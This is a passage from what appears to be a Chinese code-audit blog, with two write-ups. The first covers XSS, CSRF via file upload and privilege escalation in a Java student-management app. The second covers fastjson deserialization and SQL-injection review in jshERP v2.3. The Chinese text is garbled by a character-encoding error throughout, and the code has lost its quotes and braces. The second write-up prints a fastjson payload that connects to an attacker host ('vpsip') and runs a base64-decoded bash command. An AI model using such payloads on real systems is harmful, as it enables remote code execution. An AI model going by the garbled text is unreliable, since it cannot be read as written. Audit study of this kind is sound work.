ç”±äºé„™äººå¯¹æ‹¦æˆªå™¨ä½•æ—¶å¼€å§‹ä½œç”¨è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œæƒ³ç€æ—¢ç„¶å¯¹/uploadç›®å½•ä¸‹çš„æ‰€æœ‰è·¯å¾„è¯·æ±‚éƒ½ä¸ä¼šè¿›è¡Œæ£€æµ‹ï¼Œé‚£ä¹ˆæˆ‘é€šè¿‡/upload/../ä»»æ„è·¯ç”±æ˜¯ä¸æ˜¯å°±å¯ä»¥è¿›è¡Œä¸€ä¸ªæˆåŠŸçš„ç»•è¿‡ï¼Œç»“æœå½“ç„¶æ˜¯å¤±è´¥çš„ï¼Œåé¢é—®äº†ä¸‹aiæ‰æ˜ç™½åœ¨Spring MVCä¸­ï¼Œæ‹¦æˆªå™¨è·¯å¾„åŒ¹é…ä¼šå…ˆè¿›è¡Œè§„èŒƒåŒ–å¤„ç†ï¼Œä¼šè‡ªåŠ¨å°†åŒ…å« ..çš„è·¯å¾„è§£æä¸ºæ ‡å‡†ç»å¯¹è·¯å¾„ï¼Œæ‰€ä»¥ä¸Šé¢ä¼šè¢«è§£æä¸º/ä»»æ„è·¯ç”±åå†ç»è¿‡æ‹¦æˆªå™¨çš„è·¯å¾„åŒ¹é… é‚£åˆ°ç›®å‰ä¸ºæ­¢è¿™æ˜¯ç»•ä¸è¿‡å»çš„äº†ï¼Œæ— æ‡ˆå¯å‡»ï¼Œæˆ‘ä»¬å…ˆæ”¾ä¸€æ— çº¯ç²¹çš„xssokï¼Œç°åœ¨å…ˆè½¬ç§»è§†çº¿ï¼Œå»æµ‹æµ‹æ¯ä¸ªåŠŸèƒ½ç‚¹ï¼Œä¸»è¦å…ˆä»æ¯”è¾ƒå¯èƒ½å­˜åœ¨æ¼æ´çš„ç‚¹å¼€å§‹ï¼Œæ¯”å¦‚æ–‡ä»¶ä¸Šä¼ ï¼Œä¿®æ”¹ä¿¡æ¯ç­‰ç­‰ æˆ‘å…ˆéšä¾¿ç™»äº†ä¸ªå­¦ç”Ÿè´¦å·å¼€å§‹æµ‹åŠŸèƒ½ç‚¹ï¼Œæ‰¾äº†ä¸ªå¯ä»¥ä¿®æ”¹å­¦ç”Ÿä¿¡æ¯çš„ç‚¹ çœ‹åˆ°è¾“å…¥æ¡†å°±æ‰‹ç—’ç—’ï¼Œæµ‹ä¸€æ‰‹çœ‹æ˜¯å¦å­˜åœ¨xssï¼Œé™¤äº†å§“åæ¡†å¤–å‰©ä¸‹çš„éƒ½æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼Œæ‰€ä»¥å¯¹å§“åå°è¯•ä¸€æ‰‹ï¼šscriptalert(1)/scriptï¼Œç‚¹å‡»æäº¤ï¼Œç«‹å³å¼¹å‡ºè­¦å‘Šæ¡† å¯æƒœçš„æ˜¯æŸ¥çœ‹è¡¨çš„æ—¶å€™å‘ç°è¯¥æ¡é™åˆ¶äº†è¾“å…¥å­—ç¬¦æ•°ï¼Œå°±32ä¸ªï¼ŒåŸºæœ¬é€ æˆä¸äº†å±å®³äº† å»è¯•éªŒäº†å…¶ä»–åœ°æ–¹ç‚¹ï¼Œæ¯”å¦‚è€å¸ˆçš„è¯¾ç¨‹ç®¡ç†ä¸­çš„ä¿®æ”¹è¯¾ç¨‹è¯¾ç¨‹ä¿¡æ¯çš„åŠŸèƒ½ç‚¹ï¼Œå…¶ä¸­çš„è¯¾ç¨‹åç§°ä¹Ÿå¯ä»¥å®ç°xssï¼Œä½†æ˜¯ä¹Ÿé™åˆ¶äº†å­—ç¬¦æ•°ï¼Œæ— æ³•é€ æˆå±å®³ï¼Œé™¤äº†å¼¹çª— ä»»æ„æ–‡ä»¶ä¸Šä¼ é€šæ€å­˜å‚¨å‹xsså›åˆ°ä¿®æ”¹å­¦ç”Ÿä¿¡æ¯çš„é‚£ä¸ªåŠŸèƒ½ç‚¹ï¼Œæˆ‘ä»¬å‘ç°ä¸‹é¢æœ‰ä¸€ä¸ªä¸Šä¼ å›¾ç‰‡çš„åŠŸèƒ½ï¼ŒæŠ“ä¸ªåŒ…ï¼Œè·¯ç”±æ˜¯/student/editStudentï¼Œæ‰¾åˆ°ç›¸å…³çš„ä»£ç ï¼Œä½äºsrcmainjavacomwddstudentmanagercontrollerStudentController.javaä¸­ åœ¨çœ‹å®ŒeditStudentæ–¹æ³•åï¼Œå¾ˆç®€å•åœ°å°±å‘ç°å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„æ£€éªŒï¼Œä¸Šä¼ ä»»æ„åç¼€çš„æ–‡ä»¶éƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶åè¿›è¡ŒéšæœºåŒ–å¤„ç†ï¼Œä½†æ²¡æœ‰å½±å“ å¯ä»¥ä¸Šä¼ ä»»æ„çš„æ–‡ä»¶ï¼Œä½†æ˜¯åœ¨ä¹‹å‰å®¡pom.xmlæ–‡ä»¶çš„æ—¶å€™æˆ‘ä»¬å°±çŸ¥é“äº†è¿™æ˜¯ä¸€ä¸ªçº¯ç²¹çš„springmvcç³»ç»Ÿï¼Œå¯¹jspåç¼€çš„æ–‡ä»¶ä¸ä¼šè¿›è¡Œä»»ä½•çš„å¤„ç†ï¼Œæ‰€ä»¥ä¼ ä¸äº†æœ¨é©¬äº† ä½†æ˜¯é™¤äº†è¿™ä¸ªå¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åšå¾ˆå¤šå…¶ä»–çš„äº‹æƒ…ï¼Œè¿™é‡Œæˆ‘å°±ä¸Šä¼ äº†ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œè¦éªŒè¯èƒ½å¤Ÿé€ æˆå±å®³çš„è¯é‚£è¿™é‡Œæˆ‘å°±æ˜¯æµ‹è¯•èƒ½å¦è¿›è¡Œé‡å®šå‘ï¼Œå†…å®¹å¦‚ä¸‹ï¼š !DOCTYPE htmlhtmlbody p111111111/p/bodyscriptwindow.location.href = https://www.baidu.com;/script/html ä¸Šä¼ æˆåŠŸï¼Œä½†ç›´æ¥è®¿é—®çš„è¯å´åŠ è½½å¤±è´¥äº†ï¼Œä»¥ä¸ºåˆå¤±è´¥äº†ï¼Œé—®äº†å­¦é•¿åæ‰æ˜ç™½è¿™æ˜¯å› ä¸ºspringmvcæœ¬èº«çš„ç‰¹æ€§ï¼Œé‚£äº›é™æ€èµ„æºéƒ½æ˜¯åœ¨ç¼–è¯‘çš„æ—¶å€™åŠ è½½å®Œçš„ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬é‡å¯ä¸€ä¸‹é¡¹ç›®ä¹‹åå†è®¿é—®ä¾¿å¯ä»¥ å®Œæ•´çš„urlå¾ˆå®¹æ˜“é€šè¿‡burpsuiteè·å–åˆ° ç»§ç»­è®¿é—®æˆåŠŸé‡å®šå‘åˆ°ç™¾åº¦ æ”¶è·ä¸€ä¸ªé€šæ€å­˜å‚¨å‹xss csrfä»¥ä¸ºå¯¹äºä»»æ„æ–‡ä»¶ä¸Šä¼ çš„åˆ©ç”¨å°±åˆ°æ­¤ä¸ºæ­¢äº†å—ï¼Œä¸ä¸ä¸ ç”±äºä¸Šé¢å®ç°äº†xssï¼Œè‡ªç„¶è€Œç„¶åœ°å°±æƒ³åˆ°äº†èƒ½å¦å®ç°csrf äºæ˜¯ç™»å½•äº†ä¸€ä¸ªæ•™å¸ˆè´¦å·ï¼Œè€Œåœ¨æ•™å¸ˆçš„é¡µé¢ä¸­ä¼šè‡ªåŠ¨åŠ è½½å­¦ç”Ÿåˆ—è¡¨ï¼Œç‚¹å‡»ä¿®æ”¹çš„è¯ä¼šè‡ªåŠ¨åŠ è½½å­¦ç”Ÿçš„ç›¸ç‰‡ æ‰¾äº†ä¸€ä¸ªæ·»åŠ å­¦ç”Ÿçš„åŠŸèƒ½ç‚¹ï¼Œè·¯ç”±æ˜¯studentaddStudentï¼Œå¹¶ä¸”å®¡å…¶ç›¸å…³åŠŸèƒ½çš„ä»£ç çš„æ—¶å€™å‘ç°ä¹Ÿæ²¡æœ‰å¯¹csrfè¿›è¡Œä¸€ä¸ªé˜²å¾¡ äºæ˜¯æˆ‘ä»¬æŠ“ä¸‹æ·»åŠ å­¦ç”Ÿçš„æ•°æ®åŒ…ï¼Œç”Ÿæˆcsrf poc å¤åˆ¶å®Œhtmlä»£ç åè‡ªå·±åˆ›ä¸€ä¸ªhtmlæ–‡ä»¶æ‰”è¿›å»ï¼Œç„¶ååœ¨ä»»æ„ä¸€ä¸ªå­¦ç”Ÿè´¦å·é‡Œé¢ä¿®æ”¹ä¿¡æ¯ï¼Œå°†è¯¥htmlæ–‡ä»¶ä¸Šä¼ ä¸Šå» æ¥ç€æˆ‘ä»¬é€€å‡ºå­¦ç”Ÿè´¦å·ï¼Œç™»å½•å›æ•™å¸ˆè´¦å·ï¼Œé€‰ä¸­æˆ‘ä»¬è‡ªå·±ä¸Šé¢æ”¹äº†çš„é‚£ä¸ªå­¦ç”Ÿæ¡ç›®ç‚¹å‡»ä¿®æ”¹ï¼Œæ‰“å¼€å›¾ç‰‡ é¡µé¢å¦‚ä¸‹æ‰€ç¤º è¿™è¯´æ˜æˆ‘ä»¬å·²ç»æˆåŠŸæ‰§è¡Œäº†csrfï¼Œé‡æ–°åˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼Œå°±ä¼šå‘ç°å­¦ç”Ÿåˆ—è¡¨ç•Œé¢å¤šäº†ä¸€ä¸ªäººå‡ºæ¥ ä¸æ­¢æ˜¯æ·»åŠ å­¦ç”Ÿçš„åŠŸèƒ½ï¼Œç»è¿‡æµ‹è¯•ä¹‹ååˆ é™¤åŠŸèƒ½ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå‰©ä¸‹çš„å…¶ä»–åŠŸèƒ½å°±æ²¡æœ‰ç»§ç»­å»æµ‹è¯•äº†ï¼Œä½†åº”è¯¥éƒ½æ˜¯å¯ä»¥å®ç°csrfçš„ åŒæ ·ä¸ä»…ä»…åªæ˜¯æ•™å¸ˆå’Œå­¦ç”Ÿä¹‹é—´èƒ½å®ç°csrfï¼Œåœ¨ç®¡ç†å‘˜å’Œæ•™å¸ˆä¹‹é—´ä¹Ÿå¯ä»¥å®ç°csrfï¼ŒåŒæ ·çš„æ¯”å¦‚æ˜¯æ·»åŠ æ•™å¸ˆåŠŸèƒ½ç­‰ç­‰ï¼Œåœ¨è¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾å‡ºæ¥äº† æ”¶è·csrfæ¼æ´ å¯èƒ½ä¼šæœ‰äººç–‘æƒ‘ä¸ºä»€ä¹ˆéœ€è¦æ‰“å¼€å›¾ç‰‡æ‰ä¼šå®ç°æ“ä½œï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¿®æ”¹é¡µé¢æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡æ˜¯ä»¥imgæ ‡ç­¾çš„å½¢å¼å­˜åœ¨çš„ è€Œè¿™æ ·å­çš„è¯å°±ç›¸å½“äºåªæ˜¯å¼•ç”¨äº†è¯¥urlï¼Œå¹¶æ²¡æœ‰å¯¹è§£æå…¶ä¸­çš„jsç­‰ï¼Œè‡ªç„¶å°±æ— æ³•ç›´æ¥è§¦å‘æ¼æ´ å‚ç›´è¶Šæƒå¯æ˜¯ä¸Šé¢çš„å±å®³éƒ½ä¸æ˜¯å¾ˆå¤§ï¼Œå°±åœ¨å·®ä¸å¤šè¦å¿ƒç°æ„å†·çš„æ—¶å€™ï¼Œæˆ‘å‘ç°äº†ä¸åŒçš„æ–¹æ³•ä¹‹é—´æœ‰çš„éªŒè¯äº†ç”¨æˆ·çš„èº«ä»½ä½†æ˜¯æœ‰çš„æ²¡æœ‰ å°±æ¯”å¦‚åœ¨StudentController.javaä¸­çš„getStudentListæ–¹æ³• åœ¨è¯¥æ–¹æ³•ä¸­æœ‰é€šè¿‡sessionæ¥éªŒè¯ç”¨æˆ·æ˜¯è€å¸ˆè¿˜æ˜¯å­¦ç”Ÿå¹¶æ˜¾ç¤ºç›¸å¯¹åº”çš„å†…å®¹ ä½†æ˜¯åœ¨æ·»åŠ å­¦ç”Ÿè¿™ä¸ªæ–¹æ³•ä¸­ @RequestMapping(/addStudent)@ResponseBodypublic AjaxResult addStudent(@RequestParam(file) MultipartFile[] files,Student student) throws IOException AjaxResult ajaxResult = new AjaxResult(); student.setSn(SnGenerateUtil.generateSn(student.getClazzId())); // å­˜æ”¾ä¸Šä¼ å›¾ç‰‡çš„æ–‡ä»¶å¤¹ File fileDir = UploadUtil.getImgDirFile(); for(MultipartFile fileImg : files) // æ‹¿åˆ°æ–‡ä»¶å String extName = fileImg.getOriginalFilename().substring(fileImg.getOriginalFilename().lastIndexOf(.)); String uuidName = UUID.randomUUID().toString(); try // æ„å»ºçœŸå®çš„æ–‡ä»¶è·¯å¾„ File newFile = new File(fileDir.getAbsolutePath() + File.separator +uuidName+ extName); // ä¸Šä¼ å›¾ç‰‡åˆ° -ã€‹ â€œç»å¯¹è·¯å¾„â€ fileImg.transferTo(newFile); catch (IOException e) e.printStackTrace(); student.setPhoto(uuidName+extName); //ä¿å­˜å­¦ç”Ÿä¿¡æ¯åˆ°æ•°æ®åº“ try int count = studentService.addStudent(student); if(count 0) ajaxResult.setSuccess(true); ajaxResult.setMessage(ä¿å­˜æˆåŠŸ); else ajaxResult.setSuccess(false); ajaxResult.setMessage(ä¿å­˜å¤±è´¥); catch (Exception e) e.printStackTrace(); ajaxResult.setSuccess(false); ajaxResult.setMessage(ä¿å­˜å¤±è´¥); ajaxResult.setSuccess(true); return ajaxResult; æˆ‘ä»¬å¯ä»¥å‘ç°å…¨ç¨‹ä¸­æ²¡æœ‰å¯¹ç”¨æˆ·çš„èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œé‚£ä¸å°±ä»£è¡¨è¿™é‡Œå¯èƒ½å­˜åœ¨è¶Šæƒäº†å— äºæ˜¯æˆ‘ä»¬å°†æ·»åŠ å­¦ç”Ÿçš„è¯·æ±‚è¿›è¡Œæ‹¦æˆªï¼Œå°†cookieæ¢æˆä»»æ„ä¸€ä¸ªå­¦ç”Ÿè´¦å·çš„ æˆåŠŸæ·»åŠ ï¼Œåˆ·æ–°ä¸€ä¸‹è€å¸ˆçš„å­¦ç”Ÿåˆ—è¡¨é¡µé¢ ç”±äºä¸Šé¢éƒ½æ˜¯å›´ç»•æ·»åŠ å­¦ç”Ÿè¿™ä¸ªåŠŸèƒ½ç‚¹è¿›è¡Œè®²è§£ï¼Œæ‰€ä»¥è¿™é‡Œå°±å†åŠ ä¸€ä¸ªåŠŸèƒ½ç‚¹è¿›è¡Œæµ‹è¯•ï¼Œç»è¿‡ä¸€å®šçš„å®¡è®¡åé€‰çš„æ˜¯å®¡æ ¸è¯·å‡æ¡çš„åŠŸèƒ½ç‚¹ é€‰ä¸­å®¡æ ¸ï¼Œç‚¹å‡»æäº¤ï¼Œè¿›è¡Œæ‹¦æˆª å‘é€åˆ°é‡æ”¾å™¨ï¼Œä¿®æ”¹cookieå€¼ï¼Œå‘é€ï¼Œå´ç›´æ¥302è·³è½¬åˆ°äº†ç™»å½•ç•Œé¢ å’¦ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºé—®é¢˜å‡ºåœ¨å®¡æ‰¹çš„sqlè¯­å¥ä¸­æœ‰éœ€è¦æ•™å¸ˆèº«ä»½çš„åœ°æ–¹ï¼Œä½†ç”±äºæˆ‘ä»¬æ˜¯å­¦ç”Ÿèº«ä»½æ‰€ä»¥sqlè¯­å¥æ‰§è¡Œä¸æˆåŠŸ åœ¨LeaveController.javaçš„checkLeaveæ–¹æ³•ä¸­ä¸€ç›´è·Ÿåˆ°åº•å±‚çš„sqlè¯­å¥å¤„ update id=checkLeave parameterType=Leave update s_leave set student_id = #studentId,info = #info,status = #status,remark = #remark where id = #id/update å¯ä»¥å‘ç°å¹¶ä¸æ˜¯åƒæˆ‘æƒ³çš„é‚£æ ·ï¼Œé‚£åº”è¯¥å°±æ˜¯cookieè¿‡æœŸäº†ï¼Œä½äºSystemController.javaä¸­çš„logoutæ–¹æ³•çš„ä»£ç è¯æ˜äº†æˆ‘çš„çŒœæƒ³ ä¸€æ—¦æˆ‘ç™»å‡ºä¹‹åcookieä¾¿è¿‡æœŸäº†ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨æˆ‘ä»¬è¿›è¡Œè¶Šæƒçš„è¿‡ç¨‹ä¸­ï¼Œå­¦ç”Ÿè´¦å·ä¸èƒ½é€€å‡º é‡æ–°ç™»å½•äº†ä¸€ä¸ªå­¦ç”Ÿè´¦å·ï¼Œå†æ¬¡ä¿®æ”¹cookieï¼Œå“åº”â€œå®¡æ‰¹æˆåŠŸâ€ ç»è¿‡æµ‹è¯•ï¼Œé™¤äº†å‡ ä¸ªç‰¹å®šçš„æ–¹æ³•ä¹‹å¤–ï¼Œå‰©ä¸‹çš„å­¦ç”Ÿä¸è€å¸ˆé—´ï¼Œè€å¸ˆä¸ç®¡ç†å‘˜é—´éƒ½æ˜¯å¯ä»¥è¿›è¡Œå‚ç›´è¶Šæƒçš„ æ€»ç»“æ€»è€Œè¨€ä¹‹ï¼Œè¯¥é¡¹ç›®çš„å®¡è®¡éš¾åº¦ä¸å¤§ï¼Œé¡¹ç›®ç»“æ„æ¯”è¾ƒç®€å•æ¸…æ™°ï¼Œä»£ç é€»è¾‘ä¹Ÿæ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œå¹¶æ²¡æœ‰å°è£…å¾ˆå¤šå±‚ï¼Œæ‰€ä»¥å…³é”®å°±åœ¨äºå®¡è®¡çš„æ€è·¯ å¸Œæœ›æˆ‘çš„å®¡è®¡æ€è·¯èƒ½å¤Ÿå¯¹è¯»è€…ä»¬æœ‰ä¸€å®šçš„å¸®åŠ© è¿™ä¸ªé¡¹ç›®çš„å®¡è®¡åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œç¬”è€…ä¸€å…±å°±åªæŒ–å‡ºäº†ä¸Šé¢å‡ ä¸ªæ¼æ´ï¼Œå¦‚æœè¿˜æœ‰äººæŒ–å‡ºäº†æ›´å¤šçš„æ¬¢è¿å’Œç¬”è€…è¿›è¡Œäº¤æµ","categories":["ä»£ç å®¡è®¡"]},{"title":"ä»£ç å®¡è®¡-jshERP v2.3","path":"/2025/05/27/ä»£ç å®¡è®¡-jshERP-v2-3/","content":"å‚è€ƒæ·±å…¥å­¦ä¹ Javaä»£ç å®¡è®¡æŠ€å·§â€”è¯¦ç»†å‰–ææŸerpæ¼æ´-å…ˆçŸ¥ç¤¾åŒº ç¯å¢ƒæ­å»ºhttps://github.com/jishenghua/jshERP/releases/tag/2.3 javaç‰ˆæœ¬ä¸º1.8 åˆ›å»ºå®Œæ•°æ®åº“ä¹‹åï¼Œåœ¨application.propertiesæ–‡ä»¶ä¸­ä¿®æ”¹ç›¸å…³çš„æ•°æ®åº“æ•°æ® ç„¶åå°±å¯ä»¥å¯åŠ¨äº† ä¸‹é¢ä¸ºä¸€ä½å¸ˆå‚…çš„å®¡è®¡æ€è·¯ï¼Œä¸ªäººè§‰å¾—æ˜¯éå¸¸çš„æœ‰é“ç† å¯¹äºJavaä»£ç å®¡è®¡ï¼Œä¸»è¦çš„å®¡è®¡æ­¥éª¤å¦‚ä¸‹ï¼š ç¡®å®šé¡¹ç›®æŠ€æœ¯æ¡†æ¶ã€é¡¹ç›®ç»“æ„ ç¯å¢ƒæ­å»º é…ç½®æ–‡ä»¶çš„åˆ†æï¼šå¦‚pom.xmlã€web.xmlç­‰ï¼Œç‰¹åˆ«æ˜¯pom.xmlï¼Œå¯ä»¥ä»ç»„ä»¶ä¸­å¯»æ‰¾æ¼æ´ Filteråˆ†æï¼šFilteræ˜¯é‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼Œæå‰åˆ†ææœ‰åˆ©äºæŠŠæ¡é¡¹ç›®å¯¹è¯·æ±‚çš„è¿‡æ»¤ï¼Œåœ¨åç»­æ¼æ´åˆ©ç”¨æ—¶èƒ½å¤Ÿç»¼åˆåˆ†æ è·¯ç”±åˆ†æï¼šéƒ¨åˆ†é¡¹ç›®è¯·æ±‚è·¯å¾„ä¸å¯¹ç”¨çš„controlleræ–¹æ³•ä¸å¯¹åº”ï¼Œæå‰é€šè¿‡æŠ“åŒ…è°ƒè¯•åˆ†æï¼Œäº†è§£å‰ç«¯è¯·æ±‚åˆ°åç«¯æ–¹æ³•çš„å¯¹åº”å…³ç³»ï¼Œä¾¿äºåœ¨åç»­åˆ†æä¸­æ›´å¿«å®šä½ä»£ç  æ¼æ´æ¢æµ‹ æ¢æµ‹ä¹‹å‰å¯å€Ÿç”¨å·¥å…·è¾…åŠ©åˆ†æï¼Œå¦‚codeqlã€fortifyã€Yakitã€BPç­‰ SQLæ³¨å…¥åˆ†æã€RCEåˆ†æå¯å…ˆä»ä»£ç å…¥æ‰‹ï¼Œé€šè¿‡å…³é”®APIåŠç‰¹å¾å…³é”®å­—æ¥è¿›è¡Œé€†å‘æ•°æ®æµåˆ†æï¼Œä»sinkåˆ°sourceï¼Œåˆ¤æ–­å‚æ•°æ˜¯å¦å¯æ§ XSSã€æ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´é€‚åˆæ­£å‘æ•°æ®æµåˆ†æï¼Œç”±äºå­˜å‚¨å‹XSSæ•°æ®æµæ–­è£‚ï¼Œä»ä»£ç å±‚é¢ä¸å¥½å°†ä¸¤æ¡æ•°æ®æµè”ç³»èµ·æ¥ï¼Œå¯ä»¥é€šè¿‡å‰ç«¯ç•Œé¢çš„æµ‹è¯•ï¼Œæ‰¾åˆ°æ’å…¥å£å’Œæ˜¾ç¤ºå¤„æ€§è´¨ä¸€æ ·çš„ç‚¹ï¼Œåœ¨é€šè¿‡åç«¯ä»£ç åˆ†æï¼Œæ„é€ å‡ºå¯åˆ©ç”¨çš„payload é€»è¾‘æ¼æ´è¿™ç±»ä¹Ÿæ˜¯ä»å‰ç«¯å…¥æ‰‹æ¯”è¾ƒå¥½å¤„ç†ï¼Œåç«¯ä»£ç åºå¤§éš¾ä»¥å®šä½ é…ç½®æ–‡ä»¶å®¡è®¡é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ä¸€çœ¼pom.xmlï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´ fastjsonç‰ˆæœ¬ä¸º1.2.55ï¼Œå­˜åœ¨æ¼æ´ äºæ˜¯ä¹ï¼Œæˆ‘ä»¬å…¨å±€æœç´¢ä¸€ä¸‹parseObjectæ–¹æ³• çŒœæµ‹searchå¯èƒ½å¯æ§ï¼Œè¿›å…¥åˆ†æ æŸ¥çœ‹getInfoå‡½æ•°çš„è°ƒç”¨å¤„ï¼Œæ¯”è¾ƒå¤šï¼Œä¸€ä¸ªä¸€ä¸ªç­›é€‰ï¼Œè¿™é‡Œé€‰æ‹©UserComponent.javaä¸­çš„getUserListæ–¹æ³•è¿›è¡Œåˆ†æ private List? getUserList(MapString, String map)throws Exception String search = map.get(Constants.SEARCH); // è¿™é‡Œ String userName = StringUtil.getInfo(search, userName); String loginName = StringUtil.getInfo(search, loginName); String order = QueryUtils.order(map); String filter = QueryUtils.filter(map); return userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map)); é€å±‚å‘ä¸Šè°ƒç”¨åˆ†æï¼Œå¯ä»¥å¾—çŸ¥åœ¨ResourceController.javaä¸­è°ƒç”¨selectï¼Œå³searchå‚æ•°å¯æ§ @GetMapping(value = /apiName/list) public String getList(@PathVariable(apiName) String apiName, @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize, @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage, @RequestParam(value = Constants.SEARCH, required = false) String search, HttpServletRequest request)throws Exception MapString, String parameterMap = ParamUtils.requestToMap(request); parameterMap.put(Constants.SEARCH, search); PageQueryInfo queryInfo = new PageQueryInfo(); MapString, Object objectMap = new HashMapString, Object(); if (pageSize != null pageSize = 0) pageSize = 10; String offset = ParamUtils.getPageOffset(currentPage, pageSize); if (StringUtil.isNotEmpty(offset)) parameterMap.put(Constants.OFFSET, offset); // è¿™é‡Œ List? list = configResourceManager.select(apiName, parameterMap); objectMap.put(page, queryInfo); if (list == null) queryInfo.setRows(new ArrayListObject()); queryInfo.setTotal(BusinessConstants.DEFAULT_LIST_NULL_NUMBER); return returnJson(objectMap, æŸ¥æ‰¾ä¸åˆ°æ•°æ®, ErpInfo.OK.code); queryInfo.setRows(list); queryInfo.setTotal(configResourceManager.counts(apiName, parameterMap)); return returnJson(objectMap, ErpInfo.OK.name, ErpInfo.OK.code); æ ¹æ®è·¯ç”±åˆ†æï¼Œè¿™é‡Œçš„apiNameä¸ºuserï¼Œè¿™æ ·èƒ½å¤Ÿå¯»æ‰¾åˆ°UserComponenté‡Œçš„selectæ–¹æ³•ï¼ˆä¸‹é¢è®²sqlæ³¨å…¥æ¼æ´çš„æ—¶å€™ä¼šè§£é‡Šä¸ºä»€ä¹ˆæ˜¯userï¼‰ äºæ˜¯æˆ‘ä»¬åˆ°è¯¥è·¯ç”±ä¸‹é¢è¿›è¡Œæµ‹è¯• ç„¶åå»bpçš„ä¸“é—¨æ¿å—é‡Œé¢è¿›è¡ŒæŸ¥çœ‹ä¾¿å¯ä»¥çœ‹åˆ°dnsè¯·æ±‚äº†ï¼Œè¯æ˜æ¼æ´å­˜åœ¨ æ¥ä¸‹æ¥å¯ä»¥è¿›è¡ŒLDAPæ³¨å…¥ï¼Œä½†æ˜¯éœ€è¦ç¡®å®šAutoTypeæ˜¯å¦å¼€å¯ å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç å¼€å¯ ParserConfig.getGlobalInstance().setAutoTypeSupport(true); ä½†æ˜¯åœ¨å®é™…æµ‹è¯•çš„è¿‡ç¨‹ä¸­ï¼Œæ²¡æœ‰å¼€å¯å¯ä»¥é€šè¿‡mysqlæœåŠ¡æ¥æ‰“ payloadï¼š @type: java.lang.AutoCloseable, @type: com.mysql.jdbc.JDBC4Connection, hostToConnectTo: vpsip, portToConnectTo: 3306, info: user: yso_CommonsCollections6_bash -c echo,xxxxx|base64,-d|bash,-i, password: pass, statementInterceptors: com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor, autoDeserialize: true, NUM_HOSTS: 1 , databaseToConnectTo: dbname, url: å‚è€ƒï¼šè“å¸½æ¯2022å†³èµ› - èµŒæ€ª writeup - KingBridge - åšå®¢å›­ (cnblogs.com) è¿™é‡Œå°±ä¸ç»§ç»­æµ‹è¯•ï¼Œå¤§è‡´åŸç†æ˜¯è¿™æ ·ï¼Œå¦‚æœä¸æ‡‚fastjsonï¼Œè¯·å‚è€ƒï¼šFastjsonå§¿åŠ¿æŠ€å·§é›†åˆ ä¾èµ–log4j dependency groupIdorg.apache.logging.log4j/groupId artifactIdlog4j-to-slf4j/artifactId version2.10.0/version scopecompile/scope /dependency æ— ç›¸å…³æ¼æ´ï¼Œå¯ä»¥é€šè¿‡å®˜æ–¹æ–‡æ¡£æˆ–è€…mavenä»“åº“ä¸­æŸ¥çœ‹ï¼šMaven Repository: org.apache.logging.log4j Â» log4j-to-slf4j (mvnrepository.com) ä»é…ç½®æ–‡ä»¶ä¸­è¿˜å¾—çŸ¥äº†ç”¨äº†mybatisæ¡†æ¶å’Œswagger SQLæ³¨å…¥ é‡ç‚¹å…³æ³¨åˆ›å»ºæŸ¥è¯¢çš„å‡½æ•°å¦‚ createQuery()ã€createSQLQuery()ã€createNativeQuery()ã€‚ å®šä½SQLè¯­å¥ä¸Šä¸‹æ–‡ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å‚æ•°ç›´æ¥æ‹¼æ¥ï¼Œæ˜¯å¦æœ‰å¯¹æ¨¡ç³ŠæŸ¥è¯¢å…³é”®å­—çš„è¿‡æ»¤ã€‚ æ˜¯å¦ä½¿ç”¨é¢„ç¼–è¯‘æŠ€æœ¯ï¼Œé¢„ç¼–è¯‘æ˜¯å¦å®Œæ•´ï¼Œå…³é”®å‡½æ•°å®šä½setObject()ã€setInt()ã€setString()ã€setSQLXML()å…³è”ä¸Šä¸‹æ–‡æœç´¢set*å¼€å¤´çš„å‡½æ•°ã€‚ Mybatisä¸­æœç´¢${}ï¼Œå› ä¸ºå¯¹äºlikeæ¨¡ç³ŠæŸ¥è¯¢ã€order byæ’åºã€èŒƒå›´æŸ¥è¯¢inã€åŠ¨æ€è¡¨ååˆ—åï¼Œæ²¡æ³•ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œåªèƒ½æ‹¼æ¥ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦æ‰‹å·¥é˜²æ³¨å…¥ï¼Œæ­¤æ—¶å¯æŸ¥çœ‹ç›¸å…³é€»è¾‘æ˜¯å¦æ­£ç¡®ã€‚ JPAæœç´¢JpaSort.unsafe()ï¼ŒæŸ¥çœ‹æ˜¯å¦ç”¨å®ä½“ä¹‹å¤–çš„å­—æ®µå¯¹æŸ¥è¯¢ç»“æœæ’åºï¼Œè¿›è¡Œäº†SQLçš„æ‹¼æ¥ã€‚ä»¥åŠæŸ¥çœ‹EntityManagerçš„ä½¿ç”¨ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨æ‹¼æ¥SQLçš„æƒ…å†µã€‚ 